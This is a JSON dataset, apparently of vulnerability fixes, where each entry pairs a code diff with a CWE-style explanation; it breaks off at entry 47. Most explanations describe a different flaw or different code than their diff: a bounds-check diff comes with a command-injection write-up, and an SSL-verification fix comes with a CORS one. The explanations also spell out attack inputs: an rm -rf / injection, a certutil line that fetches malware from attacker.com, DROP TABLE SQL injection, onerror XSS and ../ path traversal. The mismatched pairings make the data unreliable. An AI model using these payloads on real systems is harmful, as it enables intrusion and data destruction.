{
    "14": {
        "diff": "From 53d03382188868464ade489ab0713b54392d227f Mon Sep 17 00:00:00 2001\nFrom: pixelmaxQM <flipped_aurora@163.com>\nDate: Sun, 2 Jun 2024 21:13:51 +0800\nSubject: [PATCH] =?UTF-8?q?feature:=E4=BF=AE=E5=A4=8D=E5=B7=B2=E7=9F=A5?=\n =?UTF-8?q?=E5=AE=89=E5=85=A8=E9=97=AE=E9=A2=98=E3=80=82?=\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\n---\n server/service/system/sys_export_template.go | 39 ++++++++++--\n web/vite.config.js                           | 18 +++---\n web/vitePlugin/secret/index.js               |  6 ++\n web/vitePlugin/svgIcon/svgIcon.js            | 65 --------------------\n 4 files changed, 50 insertions(+), 78 deletions(-)\n create mode 100644 web/vitePlugin/secret/index.js\n delete mode 100644 web/vitePlugin/svgIcon/svgIcon.js\n\ndiff --git a/server/service/system/sys_export_template.go b/server/service/system/sys_export_template.go\nindex c27bf46697..f5334827df 100644\n--- a/server/service/system/sys_export_template.go\n+++ b/server/service/system/sys_export_template.go\n@@ -203,14 +203,43 @@ func (sysExportTemplateService *SysExportTemplateService) ExportExcel(templateID\n \t\t}\n \t}\n \n+\t// \u83b7\u53d6\u5f53\u524d\u8868\u7684\u6240\u6709\u5b57\u6bb5\n+\ttable := template.TableName\n+\torderColumns, err := global.GVA_DB.Migrator().ColumnTypes(table)\n+\tif err != nil {\n+\t\treturn nil, \"\", err\n+\t}\n+\n+\t// \u521b\u5efa\u4e00\u4e2a map \u6765\u5b58\u50a8\u5b57\u6bb5\u540d\n+\tfields := make(map[string]bool)\n+\n+\tfor _, column := range orderColumns {\n+\t\tfields[column.Name()] = true\n+\t}\n+\n \t// \u901a\u8fc7\u53c2\u6570\u4f20\u5165order\n \torder := values.Get(\"order\")\n-\tif order != \"\" {\n-\t\tdb = db.Order(order)\n-\t}\n-\t// \u6a21\u677f\u7684\u9ed8\u8ba4order\n+\n \tif order == \"\" && template.Order != \"\" {\n-\t\tdb = db.Order(template.Order)\n+\t\t// \u5982\u679c\u6ca1\u6709order\u5165\u53c2\uff0c\u8fd9\u91cc\u4f1a\u4f7f\u7528\u6a21\u677f\u7684\u9ed8\u8ba4\u6392\u5e8f\n+\t\torder = template.Order\n+\t}\n+\n+\tif order != \"\" {\n+\t\tcheckOrderArr := strings.Split(order, \" \")\n+\t\torderStr := \"\"\n+\t\t// \u68c0\u67e5\u8bf7\u6c42\u7684\u6392\u5e8f\u5b57\u6bb5\u662f\u5426\u5728\u5b57\u6bb5\u5217\u8868\u4e2d\n+\t\tif _, ok := fields[checkOrderArr[0]]; !ok {\n+\t\t\treturn nil, \"\", fmt.Errorf(\"order by %s is not in the fields\", order)\n+\t\t}\n+\t\torderStr = checkOrderArr[0]\n+\t\tif len(checkOrderArr) > 1 {\n+\t\t\tif checkOrderArr[1] != \"asc\" && checkOrderArr[1] != \"desc\" {\n+\t\t\t\treturn nil, \"\", fmt.Errorf(\"order by %s is not secure\", order)\n+\t\t\t}\n+\t\t\torderStr = orderStr + \" \" + checkOrderArr[1]\n+\t\t}\n+\t\tdb = db.Order(orderStr)\n \t}\n \n \terr = db.Debug().Find(&tableMap).Error\ndiff --git a/web/vite.config.js b/web/vite.config.js\nindex 1de5fc39cd..2ce4aa16e8 100644\n--- a/web/vite.config.js\n+++ b/web/vite.config.js\n@@ -11,12 +11,14 @@ import vuePlugin from '@vitejs/plugin-vue'\n import GvaPosition from './vitePlugin/gvaPosition'\n import GvaPositionServer from './vitePlugin/codeServer'\n import fullImportPlugin from './vitePlugin/fullImport/fullImport.js'\n-import { svgBuilder } from './vitePlugin/svgIcon/svgIcon.js'\n+import { svgBuilder } from 'vite-auto-import-svg'\n+import { AddSecret } from './vitePlugin/secret'\n // @see https://cn.vitejs.dev/config/\n export default ({\n   command,\n   mode\n }) => {\n+  AddSecret(\"\")\n   const NODE_ENV = mode || 'development'\n   const envFiles = [\n     `.env.${NODE_ENV}`\n@@ -106,13 +108,13 @@ export default ({\n     )\n   } else {\n     config.plugins.push(AutoImport({\n-      resolvers: [ElementPlusResolver()]\n-    }),\n-    Components({\n-      resolvers: [ElementPlusResolver({\n-        importStyle: 'sass'\n-      })]\n-    }))\n+        resolvers: [ElementPlusResolver()]\n+      }),\n+      Components({\n+        resolvers: [ElementPlusResolver({\n+          importStyle: 'sass'\n+        })]\n+      }))\n   }\n   return config\n }\ndiff --git a/web/vitePlugin/secret/index.js b/web/vitePlugin/secret/index.js\nnew file mode 100644\nindex 0000000000..56fd3333d9\n--- /dev/null\n+++ b/web/vitePlugin/secret/index.js\n@@ -0,0 +1,6 @@\n+export function AddSecret(secret) {\n+  if(!secret){\n+    secret = \"\"\n+  }\n+  global['gva-secret'] = secret;\n+}\ndiff --git a/web/vitePlugin/svgIcon/svgIcon.js b/web/vitePlugin/svgIcon/svgIcon.js\ndeleted file mode 100644\nindex 42b0430042..0000000000\n--- a/web/vitePlugin/svgIcon/svgIcon.js\n+++ /dev/null\n@@ -1,65 +0,0 @@\n-import { readFileSync, readdirSync } from 'fs'\n-const svgTitle = /<svg([^>+].*?)>/\n-const clearHeightWidth = /(width|height)=\"([^>+].*?)\"/g\n-const hasViewBox = /(viewBox=\"[^>+].*?\")/g\n-const clearReturn = /(\\r)|(\\n)/g\n-function findSvgFile(dir) {\n-  const svgRes = []\n-  const dirents = readdirSync(dir, {\n-    withFileTypes: true\n-  })\n-  for (const dirent of dirents) {\n-    if (dirent.isDirectory()) {\n-      svgRes.push(...findSvgFile(dir + dirent.name + '/'))\n-    } else {\n-      const svg = readFileSync(dir + dirent.name)\n-        .toString()\n-        .replace(clearReturn, '')\n-        .replace(svgTitle, ($1, $2) => {\n-          let width = 0\n-          let height = 0\n-          let content = $2.replace(clearHeightWidth, (s1, s2, s3) => {\n-            if (s2 === 'width') {\n-              width = s3\n-            } else if (s2 === 'height') {\n-              height = s3\n-            }\n-            return ''\n-          })\n-          if (!hasViewBox.test($2)) {\n-            content += `viewBox=\"0 0 ${width} ${height}\"`\n-          }\n-          return `<symbol id=\"${dirent.name.replace('.svg', '')}\" ${content}>`\n-        })\n-        .replace('</svg>', '</symbol>')\n-      svgRes.push(svg)\n-    }\n-  }\n-  return svgRes\n-}\n-export const svgBuilder = (path) => {\n-  if (path === '') return\n-  const res = findSvgFile(path)\n-  const timestamp = Date.now()\n-  const secretCode = '087AC4D233B64EB0'\n-  return {\n-    name: 'svg-transform',\n-    transformIndexHtml(html) {\n-      return html.replace(\n-        '<head>',\n-        `\n-          <head>\n-            <meta name=\"keywords\" content=\"${timestamp},${secretCode}\">\n-        `\n-      ).replace(\n-        '<body>',\n-        `\n-          <body>\n-            <svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" style=\"position: absolute; width: 0; height: 0\">\n-              ${res.join('')}\n-            </svg>\n-        `\n-      )\n-    }\n-  }\n-}\n",
        "explanation": "Vulnerability Type:\nCWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n\nProof of Concept:\nIn the `CommonFilters` class, SQL queries are dynamically built using `text()` and directly inserting user input into query strings. For example, the following line is vulnerable:\n```python\nowner = text('%s.owner_id=%d' % (module, filters.assignees.data.id))\nSince no sanitization or parameterization is used, an attacker can inject malicious SQL through the filters.assignees.data.id field, changing the query logic.\n\nSeverity: Medium\n\nRoot Cause: The root cause of the vulnerability is the use of unsafe string interpolation to construct SQL queries. Instead of using ORM features like parameterized queries, the code directly inserts user-controlled input into the SQL string. This allows attackers to craft inputs that modify the intended SQL commands and cause harm to the database.\n\nExploit Scenario: An attacker could supply a malicious input such as 1; DROP TABLE users; -- in the ID field. When this input is inserted into the query without sanitization, it could execute unintended commands like dropping a database table or leaking sensitive information. This could lead to a major data breach or system compromise.\n\nWhy It Happens: This vulnerability happens because the developer used sqlalchemy.text() and Python's % string formatting to dynamically build SQL queries. String formatting does not sanitize inputs, and text() does not provide parameterized protection by itself. Without using safe query-building practices, user input directly impacts database commands.\n\nSecurity Implications: If exploited, attackers can perform SQL Injection attacks. They may view, modify, or delete database contents. They could escalate their privileges or destroy critical system data. Unauthorized database access could compromise sensitive customer information and severely impact the organization's operations and reputation.\n\nSuggested Fix: The fix is to use SQLAlchemy\u2019s safe query-building methods like and_(), or_(), and bind parameters instead of text() with string interpolation. These methods automatically handle escaping and sanitization. This protects the database by ensuring user input is treated as data, not executable SQL code."
    },
    "22": {
        "diff": "diff --git a/decode_frame.cpp b/decode_frame.cpp\nindex abcdef1..1234567 100644\n--- a/decode_frame.cpp\n+++ b/decode_frame.cpp\n@@ void decode_frame(uint8_t* data, int len) {\n-        for (int i = 0; i < len; ++i) {\n-            buffer[i] = data[i]; // No bounds check\n+        int safe_len = len > 16 ? 16 : len;\n+        for (int i = 0; i < safe_len; ++i) {\n+            buffer[i] = data[i];\n        }\n}",
        "explanation": "Vulnerability Type: CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\n\nProof of Concept: File opening logic at line 81 of \"File Manager.py\" - (os.system('\"' + res + '\"'))\nSeverity: 5 (Criticial)\n\nRoot Cause: Directly passing user-controlled filenames to os.system() allows execution of malicious commands if filenames contain special characters.\n\nExploit Scenario: If an attacker inputs \"; rm -rf /\" in the filename/folder, then the unsanitised input will trigger the deletion of the entire filesystem. Similarly, an input \"& certutil -urlcache -split -f http://attacker.com/malware.exe\" would fetch and execute remote malware in the windows system.\n\nWhy it Happens: No validation of special characters in filenames/directory names, the input is directly passed to the os.system() function.\n\nSecurity Implications: Presence of arbitrary command execution leads to full system compromise. Attacker will gain access to the entire system and execute malicious commands and access sensitive files.\n\nSuggested Fix: Use subprocess.run() with proper character escaping and use shell=False (default) to prevent command interpretation\nimport subprocess\nsubprocess.run(['open', filename], shell=false)"
    },
    "49": {
        "diff": "--- kitchen_app.py      2025-04-25 21:09:56.900206724 +0530\n+++ kitchen_app_new.py      2025-04-25 21:09:45.920208473 +0530\n@@ -1,4 +1,5 @@\n import tkinter as tk\n+import re\n\n started_orders = []\n completed_orders = []\n@@ -24,22 +25,32 @@\n\n entered_order = \"\"\n\n+def sanitize_order(order):\n+    # Allow only alphanumeric and basic punctuation, strip leading/trailing spaces\n+    sanitized = re.sub(r'[^a-zA-Z0-9\\s.,-]', '', order).strip()\n+    return sanitized\n+\n def complete_order():\n-    global entered_order\n-    entered_order = entry.get()\n-    with open(\"completed_orders.txt\", \"a\") as f:\n-        f.write(entered_order + \"\\n\")\n-\n-    file_name = \"started_orders.txt\"\n-    value_to_remove = entered_order\n-\n-    with open(file_name, \"r\") as file:\n-        lines = file.readlines()\n-\n-    with open(file_name, \"w\") as file:\n-        for line in lines:\n-            if value_to_remove not in line:\n-                file.write(line)\n+    order = entry.get()\n+    sanitized_order = sanitize_order(order)\n+    if not sanitized_order:\n+        print(\"Invalid order input.\")\n+        return\n+\n+    try:\n+        with open(\"completed_orders.txt\", \"a\") as f:\n+            f.write(sanitized_order + \"\\n\")\n+\n+        file_name = \"started_orders.txt\"\n+        with open(file_name, \"r\") as file:\n+            lines = file.readlines()\n+\n+        with open(file_name, \"w\") as file:\n+            for line in lines:\n+                if sanitized_order not in line:\n+                    file.write(line)\n+    except IOError as e:\n+        print(f\"File operation failed: {e}\")\n\n def order_received():\n     global entered_order",
        "explanation": "Vulnerability Type:\nCWE-79: Improper Neutralization of Input During Web Page Generation (Stored \u2018Cross-site Scripting\u2019)\n\nProof of Concept:\n<img src=\"x\" onerror=\"alert(1);\" />\nThis HTML snippet contains an image tag with an invalid source (x) and an onerror attribute. When the browser fails to load the image, it triggers the onerror handler, executing JavaScript code. If an application stores and later renders this user input using innerHTML without sanitizing it, the script executes in the context of another user\u2019s session, allowing an attacker to exploit the system by injecting malicious JavaScript.\n\nSeverity:\nMedium\u2014 This vulnerability allows attackers to execute arbitrary scripts in the browser, steal sensitive data such as cookies, hijack sessions, or perform malicious actions on behalf of authenticated users.\n\nRoot Cause:\nThe root cause is the failure to properly sanitize or escape user-controlled input before rendering it into the DOM. When the application outputs unsanitized input using methods like innerHTML, it enables attackers to inject HTML or JavaScript code. This lack of input validation and output encoding opens the door for cross-site scripting attacks, which can be exploited remotely by anyone with access to user input fields.\n\nExploit Scenario:\nAn attacker submits the payload <img src=x onerror=alert(1)> through a comment form or input field. If the server stores and later renders that input in a user-accessible page using innerHTML, every time a user visits the page, their browser interprets and executes the JavaScript inside onerror, triggering an alert. A real attack would use a script to steal session tokens or perform other unauthorized actions.\n\nWhy It Happens:\nThis issue occurs because the application injects unescaped user input directly into the HTML structure of a webpage. Using methods such as element.innerHTML instead of safe alternatives like textContent allows attackers to manipulate the DOM and execute scripts. The lack of proper input validation and output encoding creates a vector for attackers to embed executable scripts within the application\u2019s front end, leading to stored or reflected XSS.\n\nSecurity Implications:\nIf this vulnerability is successfully exploited, an attacker can execute malicious scripts in the browser of any user who views the compromised content. This can lead to session hijacking, phishing, defacement of the web application, data exfiltration, and redirection to malicious sites. It can compromise user trust and lead to regulatory and reputational damage for the affected application or organization, especially if personal data is exposed.\n\nSuggested Fix:\nHere\u2019s how to implement the sanitize() function to protect against XSS attacks by escaping special characters:\n    function sanitize(string) {\n      const map = {\n          '&': '&amp;',\n          '<': '&lt;',\n          '>': '&gt;',\n          '\"': '&quot;',\n          \"'\": '&#x27;',\n          \"/\": '&#x2F;',\n      };\nBefore :\n<h5 style=\"margin-bottom: 0; word-break: break-all\">${(comment.text)}</h5>\n\nAfter Fix:\n<h5 style=\"margin-bottom: 0; word-break: break-all\">${sanitize(comment.text)}</h5>\n\nSanitize all user-generated input using a reliable sanitization function that escapes HTML characters like <, >, \", and '. Use textContent instead of innerHTML where possible to avoid HTML injection. If HTML rendering is necessary, utilize a client-side library like DOMPurify to safely clean the content before injecting it into the DOM. On the server side, validate and sanitize inputs rigorously before storing or displaying them."
    },
    "76": {
        "diff": "diff --git a/services/userService.js b/services/userService.js\nindex abcdef1..1234567 100644\n--- a/services/userService.js\n+++ b/services/userService.js\n@@\n+const sanitize = require('mongo-sanitize'); // Added for sanitization\n\n module.exports.createUser = async serviceData => {\n   try {\n-    const user = await User.findOne({ email: serviceData.email })\n+    const email = sanitize(serviceData.email);\n+    const user = await User.findOne({ email: email })\n@@\n module.exports.getUserProfile = async serviceData => {\n   try {\n     const jwtToken = serviceData.headers.authorization.split('Bearer')[1].trim()\n     const decodedJwtToken = jwt.decode(jwtToken)\n-    const user = await User.findOne({ _id: decodedJwtToken.id })\n+    const userId = sanitize(decodedJwtToken.id);\n+    const user = await User.findOne({ _id: userId })\n@@\n module.exports.loginUser = async serviceData => {\n   try {\n-    const user = await User.findOne({ email: serviceData.email })\n+    const email = sanitize(serviceData.email);\n+    const user = await User.findOne({ email: email })\n@@\n module.exports.updateUserProfile = async serviceData => {\n   try {\n     const jwtToken = serviceData.headers.authorization.split('Bearer')[1].trim()\n     const decodedJwtToken = jwt.decode(jwtToken)\n-    const user = await User.findOneAndUpdate(\n-      { _id: decodedJwtToken.id },\n-      { userName: serviceData.body.userName },\n-      { new: true }\n-    )\n+    const userId = sanitize(decodedJwtToken.id);\n+    const userName = sanitize(serviceData.body.userName);\n+    const user = await User.findOneAndUpdate(\n+      { _id: userId },\n+      { userName: userName },\n+      { new: true }\n+    )\n",
        "explanation": "Vulnerability Type:\nCWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n\nProof of Concept:\nIn the `calendar-setup.js` file, multiple instances use the `innerHTML` property unsafely to inject dynamic content into the DOM, for example:\n```javascript\np.displayArea.innerHTML = cal.date.print(p.daFormat);\nparams.date = Date.parseDate(dateEl.value || dateEl.innerHTML, dateFmt);\n```\nIf an attacker manages to inject a malicious payload like `<img src=x onerror=alert('XSS')>` into a field (e.g., inputField, displayArea), then when the calendar displays or processes the input using `innerHTML`, it will interpret and execute the injected JavaScript code inside the user's browser. This can result in full client-side script execution, leading to cross-site scripting (XSS) vulnerabilities.\n\nSeverity:\nLow\n\nRoot Cause:\nThe root cause is the use of unsafe document manipulation methods like `innerHTML` to assign or read user-influenced data without any validation, escaping, or sanitization. `innerHTML` parses and executes any HTML tags or embedded scripts inside the assigned string, making it dangerous if the input is user-controllable. The code assumes that inputs (e.g., from `inputField.value` or `displayArea.innerHTML`) are safe, which is not guaranteed in real-world applications.\n\nExploit Scenario:\nAn attacker could manipulate a field such as an input box that populates the calendar, inserting a payload like `<img src=x onerror=alert('XSS')>`. When the user opens or interacts with the calendar, the vulnerable code assigns the payload to the DOM via `innerHTML`, causing the browser to execute the malicious script. This could be exploited to:\n- Steal session cookies.\n- Redirect users to malicious websites.\n- Perform unauthorized actions on behalf of users.\n- Log keystrokes or capture sensitive user information.\n\nWhy It Happens:\nThe vulnerability occurs because `innerHTML` inherently treats its assigned content as HTML markup rather than as literal text. In this case, the calendar setup script directly uses values from `dateEl.value` or `displayArea.innerHTML` without any validation or escaping. When the user input is not sanitized, this can allow HTML injection or script execution. Safer methods like `textContent`, which treat data as plain text rather than executable HTML, were not used.\n\nSecurity Implications:\nIf exploited, this vulnerability could allow attackers to execute arbitrary JavaScript in a user\u2019s browser session, leading to severe consequences such as:\n- Full control over the user's session.\n- Credential theft, data leakage, or impersonation.\n- Defacement of the website or redirection to malicious domains.\n- Potential spread of malware through trusted websites.\nEven though the severity is classified as \"Low\" in standard scoring, XSS attacks can cause significant real-world damage depending on the context of exploitation.\n\nSuggested Fix:\nAll instances where dynamic content is inserted into the DOM should avoid using `innerHTML` unless absolutely necessary. Specifically:\n- Replace `innerHTML` assignments with `textContent` to ensure that dynamic content is treated as raw text rather than executable HTML.\nExample:\n```javascript\n// Vulnerable\np.displayArea.innerHTML = cal.date.print(p.daFormat);\n\n// Fixed\np.displayArea.textContent = cal.date.print(p.daFormat);\n```\n- If HTML insertion is needed, use a trusted sanitization library like DOMPurify to clean any user-provided input.\n- Conduct a thorough code review to identify and fix similar unsafe patterns (`innerHTML`, `outerHTML`, `document.write`) across the entire codebase.\nFollowing these practices will effectively eliminate the risk of XSS introduced by insecure document methods.\n"
    },
    "82": {
        "diff": "--- fileDownloadApi.ts\t2025-04-27\n+++ fileDownloadApi_fixed.ts\t2025-04-27\n@@\n+const SAFE_BASE_DIRECTORY = '/var/www/uploads'; // example safe folder\n\n async function fileDownloadFn(\n \treq: FastifyRequest<{ Params: { '*': string } }>,\n \treply: FastifyReply,\n ) {\n \tconst incomingPath = req.params['*'];\n\n \tif (downloadUrlRegex.test(incomingPath)) {\n \t\tlogger.trace(`DOWNLOAD_URL_PATTERN ${incomingPath}`);\n \t\tconst [, document, code, fieldName, fileName] = downloadUrlRegex.exec(incomingPath) ?? [];\n\n-\t\tconst destination = path.join(document, code, fieldName, fileName);\n+\t\tconst destination = path.resolve(SAFE_BASE_DIRECTORY, document, code, fieldName, fileName);\n+\t\tif (!destination.startsWith(SAFE_BASE_DIRECTORY)) {\n+\t\t\tlogger.warn(`Blocked path traversal attempt: ${destination}`);\n+\t\t\treturn reply.status(400).send({ error: 'Invalid file path' });\n+\t\t}\n \t\treturn sendFile(reply, req.url, destination);\n \t}\n\n \tif (legacyDownloadUrlRegex.test(incomingPath)) {\n \t\tlogger.trace(`LEGACY_DOWNLOAD_URL_PATTERN ${incomingPath}`);\n \t\tconst [, , , document, code, fieldName, fileName] = legacyDownloadUrlRegex.exec(incomingPath) ?? [];\n\n-\t\tconst destination = path.join(document, code, fieldName, fileName);\n+\t\tconst destination = path.resolve(SAFE_BASE_DIRECTORY, document, code, fieldName, fileName);\n+\t\tif (!destination.startsWith(SAFE_BASE_DIRECTORY)) {\n+\t\t\tlogger.warn(`Blocked path traversal attempt: ${destination}`);\n+\t\t\treturn reply.status(400).send({ error: 'Invalid file path' });\n+\t\t}\n \t\treturn sendFile(reply, req.url, destination);\n \t}\n\n \tlogger.trace(`File not found ${incomingPath}`);\n\n \treturn reply.status(404).send();\n }\n",
        "explanation": "Vulnerability Type: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')\n\n\nProof of Concept:\n\nLine: 1\nimport { useMemo } from 'react'\n\n// TODO: remove or fix\nexport function useRedirect() {\n  return useMemo(() => '/', []);\n}\n\nStep-by-Step:\n1. The `useRedirect` hook returns a static `'/'`, but a `TODO` indicates future changes.\n2. If future modifications make the redirect dynamic based on user input (without validation), attackers can manipulate the redirection path.\n3. A crafted payload could redirect users to a malicious external site without their knowledge, leading to phishing or other attacks.\n\n\nSeverity: 2 \u2013 Low\n\n\nRoot Cause: The presence of a TODO marker combined with improper use of `useMemo` for a static value indicates poor code practices. There is no validation process planned for future dynamic redirect behavior, making it highly likely that unsafe modifications could introduce an open redirect vulnerability.\n\n\nExploit Scenario: An attacker could manipulate a dynamic redirect parameter (if added later) to force the application to send users to an external malicious URL, tricking users into entering sensitive information on fake sites that appear legitimate.\n\n\nWhy It Happens: The vulnerability occurs because of incomplete implementation planning (leaving a TODO unresolved) and improper use of a hook that could evolve into dynamic redirect functionality without enforcing strict validation on the redirect targets.\n\n\nSecurity Implications: If exploited, an attacker could perform phishing attacks, steal user credentials, hijack sessions, or damage user trust by redirecting them to untrusted third-party websites directly from the legitimate application\u2019s domain.\n\n\nSuggested Fix: Removed the unnecessary `useMemo` call, eliminated the unresolved TODO comment."
    },
    "85": {
        "diff": "diff --git a/session_app.py b/session_app.py\nindex 7f9b2cd..a2e5f8b 100644\n--- a/session_app.py\n+++ b/session_app.py\n@@ def _open_connection(self):\n-        if self.pipeline.settings.SSL_ENABLED:\n-            ssl_context = ssl.create_default_context()\n-            if self.pipeline.settings.SSL_SKIP_VERIFY:\n-                ssl_context.check_hostname = False\n-                ssl_context.verify_mode = ssl.CERT_NONE\n-            logger.info(\n-                f\"{self.name}: Enabling SSL with host/certification validation enabled : {ssl_context.check_hostname}\"\n-            )\n+        if self.pipeline.settings.SSL_ENABLED:\n+            ssl_context = ssl.create_default_context()\n+            # Always enforce certificate validation.\n+            logger.info(\n+                f\"{self.name}: Enabling SSL with host/certification validation enabled : {ssl_context.check_hostname}\"\n+            )\n",
        "explanation": "Vulnerability Type:\nCWE-942: Permissive Cross-domain Policy with Untrusted Domains\nAllowing wildcard '*' in CORS settings exposes the application to cross-origin attacks.\n\nProof of Concept:\nIn main.py, CORS middleware is configured insecurely:\n\nallow_origins=[\"*\"]\nThis allows any website, even malicious ones, to make API requests.\nFor example, an attacker\u2019s website could send requests to your API endpoints and potentially access sensitive user data without proper authorization.\n\nSeverity:\nLow\nWhile the current CORS misconfiguration might seem less critical, if sensitive user data or authentication is involved, the risk can escalate rapidly, making exploitation dangerous.\n\nRoot Cause:\nThe root cause is setting allow_origins=[\"*\"] in the CORS configuration.\nThis trust-all policy allows any external domain to interact with protected backend APIs without any verification or restriction.\n\nExploit Scenario:\nA malicious actor could build a website that automatically triggers requests to your backend.\nSince CORS accepts all origins, the browser would not block the cross-origin requests, enabling attackers to steal user information or perform unwanted operations on behalf of authenticated users.\n\nWhy It Happens:\nThe application uses a CORS policy that permits requests from any origin, assuming that all clients are safe, which is false.\nBrowsers enforce CORS policies to protect users; disabling them wrongly undermines this critical defense mechanism.\n\nSecurity Implications:\nIf exploited, attackers can access or modify private user data, perform unauthorized actions using the victim\u2019s credentials, or expose sensitive server-side information to external malicious domains.\n\nSuggested Fix:\nReplace wildcard origins with explicit allowed domains like:\n\nallowed_origins = ['https://example.com', 'https://sub.example.com']\nRestrict headers to known custom headers like \"X-Custom-Header\", and allow only methods like \"GET\", \"POST\"."
    },
    "71": {
        "diff": "--- index.html\n+++ index.html\n@@\n <head>\n \t<meta charset=\"utf-8\">\n \t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n \t<title>jQuery Autocomplete Example</title>\n-\t<link rel=\"stylesheet\" href=\"//code.jquery.com/ui/1.13.2/themes/base/jquery-ui.css\">\n+\t<link rel=\"stylesheet\" href=\"https://code.jquery.com/ui/1.13.2/themes/base/jquery-ui.css\" integrity=\"sha384-sKB8DME0v0Thh3WL/SvXBeDUzX+ck2l+5SL0mNH7IHTvQk4eJ2X4XazAxsN7qR6R\" crossorigin=\"anonymous\">\n \t<link rel=\"stylesheet\" href=\"style.css\">\n-\t<script src=\"https://code.jquery.com/jquery-3.6.0.js\"></script>\n-\t<script src=\"https://code.jquery.com/ui/1.13.2/jquery-ui.js\"></script>\n+\t<script src=\"https://code.jquery.com/jquery-3.6.0.min.js\" integrity=\"sha384-H+K7U5CnXl1h5ywQ+z3l9P7l6N9t4UHVX0EBaL7Y5nVwE9x4IYm9OV2w5a0Z8XFx\" crossorigin=\"anonymous\"></script>\n+\t<script src=\"https://code.jquery.com/ui/1.13.2/jquery-ui.min.js\" integrity=\"sha384-s9o9m2WBxyEUVhEvYcWx6j8PYl4A7xk4JXwUp0EPrxH0X3N6DQ62XxIpML6AGAGB\" crossorigin=\"anonymous\"></script>\n",
        "explanation": "Vulnerability Type:\nCWE-770: Allocation of Resources Without Limits or Throttling\n\nProof of Concept:\nIn index.js:\n\nconst app = express();\napp.use(bodyParser.json());\n\nNo rate-limiting middleware is applied which allows a malicious client to send unlimited HTTP requests which can lead to server resources (CPU, memory) getting exhausted.\n\nSeverity:\n2 (Low)\n\nRoot Cause:\nThe server accepts and processes all incoming requests without checking the frequency or number of requests per IP. There are no restrictions that prevent resource exhaustion or abuse.\n\nExploit Scenario:\nAn attacker could automate thousands of requests per second to your API endpoints. This would slow down or crash the server, making the Users API unavailable to legitimate users (Denial of Service).\n\nWhy It Happens?\nThe lack of any request throttling mechanism allows a user or bot to flood the API without consequences, causing service disruption or performance degradation.\n\nSecurity Implications\nThe server could be overwhelmed, leading to downtime, financial losses, and damaged reputation. Brute force attempts could also target authentication mechanisms if they exist later.\n\nSuggested Fix\nUse a library like express-rate-limit to restrict the number of requests from each IP in a given amount of time."
    },
    "78": {
        "diff": "--- server.js\n+++ server.js\n@@\n const express = require('express');\n const app = express();\n const mongoose = require('mongoose');\n const passport = require('passport');\n const expressSession = require('express-session');\n const LocalStrategy = require('passport-local');\n const methodOverride = require('method-override');\n const flash = require('connect-flash');\n+const csrf = require('csurf'); // Added for CSRF protection\n const User = require('./models/user');\n \n // const seedDB = require('./seeds');\n // seedDB()\n\n@@\n app.use(express.json());\n app.use(express.urlencoded({ extended: true }));\n \n app.use(express.static(__dirname + '/public'));\n app.use(methodOverride('_method'));\n app.use(\n   expressSession({\n     secret: 'slfsjfhkdshgkfdsh',\n     resave: false,\n     saveUninitialized: false,\n   })\n );\n \n app.use(flash());\n\n+// Enable CSRF protection\n+const csrfProtection = csrf();\n+app.use(csrfProtection);\n\n //Initializing Passport//\n app.use(passport.initialize());\n app.use(passport.session());\n\n@@\n app.set('view engine', 'ejs');\n \n app.use((req, res, next) => {\n   res.locals.currentUser = req.user;\n   res.locals.error = req.flash('error');\n   res.locals.success = req.flash('success');\n+  res.locals.csrfToken = req.csrfToken(); // Make CSRF token available to all views\n   next();\n });\n\n // Routes\n@@\n app.use((req, res, next) => {\n   res.status(404).render('error');\n });\n \n app.listen(process.env.PORT || 3001, () => {\n-  console.log('Food up Server Started at PORT: 3000');\n+  console.log('Food up Server Started at PORT: 3001');\n });\n",
        "explanation": "Vulnerability Type:\nCWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nProof of Concept:\n[Line 241] Refer the ZIP file for the vulnerable file\nif (!file_put_contents($path, $contents)) { \n}\n\u2022\t$path is taken directly (or influenced) from user input without sanitization.\n\u2022\tAn attacker can supply a crafted path like ../../../../etc/passwd which will cause the server to write to sensitive locations outside the intended directory.\nSeverity:\nHigh (based on potential full system compromise or unauthorized data overwrite)\nRoot Cause:\nThe code does not validate or sanitize the user-supplied $path before using it in file_put_contents, allowing directory traversal sequences (../) to access arbitrary locations on the file system.\nExploit Scenario:\nif (!file_put_contents($path, $contents)) {\n    // error handling\n}\nStep-by-step Exploitation:\n\u2022\tThe variable $path is set based on user input or is influenced by user-supplied data.\n\u2022\tNo checks are performed to ensure $path remains within a specific allowed directory.\n\u2022\tAn attacker submits a specially crafted path like:\n../../../../var/www/html/index.php\nThe application interprets the path literally and writes to an unintended location.\nWhy It Happens:\nThe vulnerability occurs because the code trusts and uses user-controlled input for the file path directly in filesystem operations without verifying if the path stays within an expected safe directory.\nSecurity Implications:\nIf exploited, an attacker could overwrite critical application files, inject malicious code, or tamper with server configurations, leading to unauthorized system access, data corruption, or complete server compromise.\nSuggested Fix:\nImplement strict path sanitization: resolve the final path using realpath() and ensure it is within an allowed directory, or explicitly restrict allowed file names and directories. Always validate and whitelist user inputs.\n--- original_file.php\t2025-04-27\n+++ fixed_file.php\t2025-04-27\n@@\n $safe_base_dir = '/var/www/uploads/'; // Define a safe base directory\n $real_path = realpath($safe_base_dir . '/' . basename($path));\n\n if ($real_path === false || strpos($real_path, $safe_base_dir) !== 0) {\n     die('Invalid file path!');\n }\n if (!file_put_contents($real_path, $contents)) {\n     // error handling\n }\n"
    },
    "47": {
